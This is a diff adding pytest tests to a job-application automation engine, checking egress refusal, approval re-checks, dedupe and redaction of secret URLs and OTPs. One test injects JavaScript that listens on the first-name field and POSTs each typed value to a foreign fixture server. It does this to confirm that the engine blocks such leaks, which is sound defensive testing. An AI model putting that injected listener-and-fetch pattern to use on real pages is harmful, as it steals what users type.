@@ -2,17 +2,18 @@
 
 from apply_cv_helpers import make_app, make_job
 import asyncio
+import json
 from contextlib import asynccontextmanager
 
 import pytest
-from apply_fakes import FakeVerifier, ScriptedPlanner, act, cv_pdf, fast, page, sample_facts, server  # noqa: F401
+from apply_fakes import FakeVerifier, FixtureServer, ScriptedPlanner, act, cv_pdf, fast, page, sample_facts, server  # noqa: F401
 from apply_service_fakes import FakePool
 from cv_fakes import save_confirmed
 
 from jobhunt import db
-from jobhunt.apply import service, store
+from jobhunt.apply import engine, service, store
 from jobhunt.apply.engine import DRY_UNTESTED, UNSUPPORTED_DISPATCH, Uploads, run_application
-from jobhunt.apply.types import RunResult, StepPlan
+from jobhunt.apply.types import RunResult, StepLog, StepPlan
 from jobhunt.cv import service as cvs
 from jobhunt.cv import store as cvstore
 
@@ -25,14 +26,110 @@ def form(snapshot):
     ])
 
 
+def approved_fixture(profile, tmp_path, url, *, title="Ingénieur systèmes embarqués", company="Société Exemple"):
+    master = save_confirmed(profile.id)
+    job = make_job(profile, url=url, title=title, company=company)
+    app = make_app(profile, job, tmp_path, master_hash=master.content_hash)
+    cvs.approve(app.id, app.current_rev)
+    return job, app
+
+
+@pytest.mark.parametrize("egress", ["write", "redirect"])
+async def test_supervised_recipient_refusal_closes_and_holds(egress, page, server, profile, tmp_path, fast):
+    foreign = FixtureServer()
+    try:
+        if egress == "redirect":
+            server.redirects["/dry_egress"] = foreign.url("collect")
+        _, app = approved_fixture(profile, tmp_path, server.url("dry_egress"))
+
+        class ProbePlanner(ScriptedPlanner):
+            async def plan(self, *args, **kwargs):
+                await page.evaluate("""target => {
+                    document.querySelector('input[name=first_name]').addEventListener('input', event => {
+                        fetch(target, {method:'POST', body:event.target.value}).catch(() => {});
+                    });
+                }""", foreign.url("collect"))
+                return await super().plan(*args, **kwargs)
+
+        result = await asyncio.wait_for(service.run(app.id, mode="supervised", trigger="user", pool=FakePool(page),
+                                                    planner=ProbePlanner(form)), timeout=12)
+        assert page.is_closed() and store.outstanding_attempt(app.id).id == result.id
+        assert "fenêtre fermée" in result.message and not foreign.requests and not foreign.posts
+    finally:
+        foreign.close()
+
+
+@pytest.mark.parametrize("changed", ["approval", "pdf", "job"])
+async def test_supervised_rechecks_after_live_scan(changed, page, server, profile, tmp_path, fast, monkeypatch):
+    job, app = approved_fixture(profile, tmp_path, server.url("dry_egress"))
+    original = engine._Run._live_decisions
+
+    async def mutate_after_scan(self, *args, **kwargs):
+        await original(self, *args, **kwargs)
+        if changed == "pdf":
+            cvs.safe_pdf(app).write_bytes(b"%PDF-1.4 changed")
+        else:
+            with db.connect() as conn:
+                if changed == "approval":
+                    conn.execute("UPDATE applications SET approved_rev=NULL WHERE id=?", (app.id,))
+                else:
+                    conn.execute("UPDATE jobs SET status='rejected' WHERE id=?", (job.id,))
+
+    monkeypatch.setattr(engine._Run, "_live_decisions", mutate_after_scan)
+    result = await asyncio.wait_for(service.run(app.id, mode="supervised", trigger="user", pool=FakePool(page),
+                                                planner=ScriptedPlanner(form)), timeout=12)
+    assert page.is_closed() and store.outstanding_attempt(app.id).id == result.id
+    assert not any(step.filled for step in result.result.steps) and not server.posts
+
+
+@pytest.mark.parametrize("canonical", [False, True])
+async def test_supervised_dedupe_canonical_or_legacy_pair_confirmation(canonical, server, profile, tmp_path):
+    first_job, first = approved_fixture(profile, tmp_path, server.url("first"))
+    second_job, second = approved_fixture(profile, tmp_path, server.url("second"),
+                                         title="Poste distinct" if canonical else "Ingénieur système embarqué")
+    if canonical:
+        metadata = json.dumps({"origin_resolution": {"tenant": "fixture", "requisition_id": "REQ-7"}})
+        with db.connect() as conn:
+            conn.execute("UPDATE jobs SET extra=? WHERE id IN (?, ?)", (metadata, first_job.id, second_job.id))
+    legacy = store.start_run(first.id, first.current_rev, "submit", "user", lambda rid: tmp_path / "legacy")
+    store.reserve_send(legacy.id, profile_id=profile.id, application_id=first.id, trigger="user", role_key="", url_key="", daily_cap=9)
+    store.finish_and_settle(legacy.id, RunResult(status="failed", message="Essai à vérifier."))
+    pool = FakePool()
+    unconfirmed = await service.run(second.id, mode="supervised", trigger="user", pool=pool,
+                                    duplicate_confirmations=((first.id, second.id),))
+    assert unconfirmed.status == "blocked" and not pool.opened
+    await service.run(second.id, mode="supervised", trigger="user", pool=pool,
+                      duplicate_confirmations=((second.id, first.id),), planner=ScriptedPlanner(form))
+    assert bool(pool.opened) is not canonical
+    assert not server.requests
+
+
+async def test_secret_url_is_not_navigated_bound_or_persisted(server, profile, tmp_path, monkeypatch):
+    monkeypatch.delenv("JOBHUNT_APPLY_LOCAL_SCREENSHOTS", raising=False)
+    target = server.url("form") + "?gh_jid=42&token=fixture-secret#private"
+    _, app = approved_fixture(profile, tmp_path, target)
+    pool = FakePool()
+    refused = await service.run(app.id, mode="supervised", trigger="user", pool=pool)
+    assert refused.status == "blocked" and not pool.opened and not server.requests
+    assert not store.active_reservations(profile.id)
+    run = store.start_run(app.id, app.current_rev, "dry_run", "user", lambda rid: tmp_path / "result")
+    recorded = store.finish_run(run.id, RunResult(status="needs_email", message="OTP: 654321",
+                                                 steps=[StepLog(index=1, url=target, page_kind="email_verification",
+                                                                screenshot="/local/fixture.png")]))
+    assert recorded.result.steps[0].url == server.url("form") + "?gh_jid=42"
+    assert "654321" not in recorded.message and not recorded.result.steps[0].screenshot
+
+
 async def test_dry_does_not_type_upload_or_click_even_on_a_page_with_background_sends(page, server, fast, cv_pdf, tmp_path):
     class ProbePlanner(ScriptedPlanner):
-        async def plan(self, *args, **kwargs):
+        async def plan(self, snapshot, facts, **kwargs):
+            assert not snapshot.text and not snapshot.url and not kwargs["history"]
+            assert all(fact.value is None and not fact.variants for fact in facts.facts)
             assert await page.evaluate("""async () => {
                 try { await fetch('/collect?offline_probe=1'); return false; }
                 catch { return true; }
             }""")
-            return await super().plan(*args, **kwargs)
+            return await super().plan(snapshot, facts, **kwargs)
 
     result = await run_application(page, url=server.url("dry_egress"), facts=sample_facts(),
                                    planner=ProbePlanner(form), verifier=FakeVerifier(), uploads=Uploads(cv_pdf=cv_pdf),
@@ -42,6 +139,14 @@ async def test_dry_does_not_type_upload_or_click_even_on_a_page_with_background_
     assert await page.locator("input[type=file]").evaluate("el => el.files.length") == 0
     assert not result.steps[-1].filled and not result.steps[-1].clicked
     assert server.sent == []
+
+
+async def test_dry_labels_value_dependent_fields_untested(page, server, cv_pdf, tmp_path):
+    result = await run_application(page, url=server.url("dry_egress"), facts=sample_facts(),
+                                   planner=ScriptedPlanner([StepPlan(page_kind="form")]), uploads=Uploads(cv_pdf=cv_pdf),
+                                   mode="dry_run", out_dir=tmp_path / "shots")
+    assert "Champs non testés : Prénom" in result.steps[0].note
+    assert not server.sent
 
 
 async def test_generic_live_engine_refuses_before_navigation_or_callbacks(page, server, cv_pdf, tmp_path):
